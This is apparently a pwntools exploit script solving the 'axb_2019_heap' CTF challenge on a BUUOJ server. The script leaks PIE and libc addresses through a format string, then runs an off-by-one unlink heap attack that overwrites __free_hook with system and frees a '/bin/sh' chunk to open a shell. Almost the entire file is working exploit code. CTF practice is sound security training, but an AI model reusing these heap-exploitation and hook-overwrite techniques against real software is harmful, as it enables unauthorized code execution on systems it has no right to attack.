#! /usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25526
elfpath = './axb_2019_heap'
ldpath = '/home/leo/tmp/libc2.23/ld-2.23.so'
libcpath = '/home/leo/tmp/libc2.23/libc6_2.23-0ubuntu10_amd64.so'

if args.LOCAL:
    p = process([ldpath, elfpath], env = {'LD_PRELOAD': libcpath})
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

def command(c):
    ru(b'>> ')
    sl(str(c).encode())

def add(index, size, content):
    command(1)
    ru(b'Enter the index you want to create (0-10):')
    sl(str(index).encode())
    ru(b'Enter a size:\n')
    sl(str(size).encode())
    ru(b'Enter the content: \n')
    sl(content)

def edit(index, content):
    command(4)
    ru(b'Enter an index:\n')
    sl(str(index).encode())
    ru(b'Enter the content: \n')
    sl(content)

def free(index):
    command(2)
    ru(b'Enter an index:\n')
    sl(str(index).encode())
    
# def show(index):
    
    
# start pwning

'''
vulns:
- format string to bypass PIE
- off-by-one
'''

ru(b'Enter your name: ')
sl(b'%11$p.%15$p')
ru(b'Hello, ')
pie = int(r(14).decode(), 16) - 0x1186
r(1)
libc_start_main = int(r(14).decode(), 16) - 240
e = ELF(elfpath)
libc = ELF(libcpath)
libc_base = libc_start_main - libc.sym['__libc_start_main']
su(f"pie: {hex(pie)}, libc: {hex(libc_base)}")

# off-by-one & unlink to modify something
add(0, 0x98, b'a'*8) # create fake chunk
add(1, 0x98, b'b'*8)
add(2, 0x98, b'/bin/sh') # avoid consolidate
note_addr = pie + 0x202060 # note 里面存的是mem地址，不是chunk地址

fd = note_addr - 0x18
bk = note_addr - 0x10
fake_chunk = b'a'*8 + p64(0x90)
fake_chunk += p64(fd) + p64(bk)
fake_chunk = fake_chunk.ljust(0x90, b'\x00')
fake_chunk += p64(0x90) + p64(0xa0)

edit(0, fake_chunk)
free(1) # unlink

# !!!full relro, so we can't change the got table
# edit(0, b'\x00'*0x18 + p64(pie + e.got['free']) + b'\x98')
# gdb.attach(p)

edit(0, b'\x00'*0x18 + p64(libc_base + libc.sym['__free_hook']) + b'\x98')
edit(0, p64(libc_base + libc.sym['system']))
free(2)

shell()


